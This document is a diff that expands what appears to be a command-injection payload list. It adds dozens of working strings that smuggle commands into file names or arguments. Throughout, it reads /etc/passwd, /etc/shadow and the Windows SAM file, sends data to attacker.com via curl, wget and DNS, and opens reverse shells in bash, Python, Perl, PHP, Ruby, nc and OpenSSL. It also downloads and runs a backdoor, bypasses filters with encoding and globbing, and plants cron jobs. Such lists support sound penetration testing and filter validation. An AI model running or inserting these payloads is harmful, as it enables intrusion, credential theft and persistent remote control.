@@ -8,9 +8,9 @@
 file.txt; cat /etc/passwd
 # Pipe injection
 file.txt | cat /etc/passwd
-# Command substitution — backticks
+# Command substitution (backticks)
 `cat /etc/passwd`
-# Command substitution — $()
+# Command substitution ($() syntax)
 $(cat /etc/passwd)
 # Background execution
 file.txt & cat /etc/passwd &
@@ -48,11 +48,11 @@ cat /etc/pass*
 ; curl http://attacker.com/$(whoami)
 # Wget exfiltration
 ; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
-# Reverse shell — bash
+# Reverse shell (bash)
 ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
-# Reverse shell — Python
+# Reverse shell (Python)
 ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-# Reverse shell — nc
+# Reverse shell (nc)
 ; nc -e /bin/sh attacker.com 4444
 # DNS exfiltration
 ; nslookup $(whoami).attacker.com
@@ -94,3 +94,99 @@ __import__('os').system('cat /etc/passwd')
 require('child_process').exec('cat /etc/passwd')
 # Ruby injection
 `cat /etc/passwd`
+# Perl injection
+; perl -e 'system("cat /etc/passwd")'
+# PHP injection via filename
+; php -r 'system("cat /etc/passwd");'
+# PowerShell command substitution
+$(Get-Content C:\Windows\System32\config\SAM)
+# PowerShell encoded command
+powershell -EncodedCommand ZwBlAHQALQBjAG8AbgB0AGUAbgB0ACAAYwA6AFwAZQB0AGMAXABwAGEAcwBzAHcAZAA=
+# Double backtick escape
+``cat /etc/passwd``
+# Dollar sign brace expansion
+${cat /etc/passwd}
+# Caret escape (Windows cmd)
+c^at /e^tc/p^asswd
+# Percent variable expansion (Windows)
+%COMSPEC% /c dir C:\users
+# Question mark glob
+cat /etc/passw?
+# Character class glob
+cat /etc/[p]asswd
+# Extended glob negation
+cat /etc/!(shadow)
+# Space bypass using $IFS
+cat$IFS/etc/passwd
+# Space bypass using tab
+cat	/etc/passwd
+# Space bypass using brace expansion
+{cat,/etc/passwd}
+# Space bypass using input redirection
+cat</etc/passwd
+# Newline as command separator
+file.txt%0acat%20/etc/passwd
+# Carriage return line feed injection
+file.txt%0d%0acat /etc/passwd
+# Vertical tab injection
+file.txt%0bcat /etc/passwd
+# Form feed injection
+file.txt%0ccat /etc/passwd
+# Unicode line separator
+file.txt\u2028cat /etc/passwd
+# Unicode paragraph separator
+file.txt\u2029cat /etc/passwd
+# Curl POST exfiltration
+; curl -X POST -d @/etc/passwd http://attacker.com/collect
+# Curl with DNS exfil
+; curl http://$(cat /etc/hostname).attacker.com
+# Wget to drop payload
+; wget http://attacker.com/backdoor.sh -O /tmp/bd.sh && sh /tmp/bd.sh
+# Python3 reverse shell
+; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("attacker.com",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
+# Perl reverse shell
+; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+# PHP reverse shell
+; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+# Ruby reverse shell
+; ruby -rsocket -e 'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+# Busybox nc reverse shell
+; busybox nc attacker.com 4444 -e /bin/sh
+# Mkfifo reverse shell
+; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f
+# OpenSSL reverse shell
+; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker.com:4444 > /tmp/s
+# Base32 encoded command
+$(echo MNQXIIDIMFWGK === | base32 -d)
+# ROT13 encoded command
+$(echo png /rgp/cnffjq | tr 'a-zA-Z' 'n-zA-Mn-za-m')
+# Decimal encoded command execution
+$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
+# Env variable concatenation bypass
+a=/etc;b=/passwd;cat $a$b
+# Whitelisted command chaining to read
+man cat | head -1; cat /etc/passwd
+# Alias injection
+alias ls='cat /etc/passwd'; ls
+# Function definition injection
+f(){ cat /etc/passwd; }; f
+# Subshell execution
+(cat /etc/passwd)
+# Coprocess injection
+coproc cat /etc/passwd
+# Process substitution (read)
+diff <(cat /etc/passwd) <(cat /etc/shadow)
+# Tee duplication
+; cat /etc/passwd | tee /tmp/stolen.txt
+# Named pipe exfiltration
+; mkfifo /tmp/pipe; cat /etc/passwd > /tmp/pipe &
+# Screen session injection
+; screen -dmS exfil bash -c 'cat /etc/passwd > /tmp/out'
+# Tmux session injection
+; tmux new -d 'cat /etc/passwd > /tmp/out'
+# Nohup background execution
+; nohup cat /etc/passwd > /tmp/out 2>&1 &
+# At job scheduling
+; echo "cat /etc/passwd > /tmp/out" | at now
+# Cron job injection
+; echo "* * * * * cat /etc/passwd > /tmp/out" | crontab -
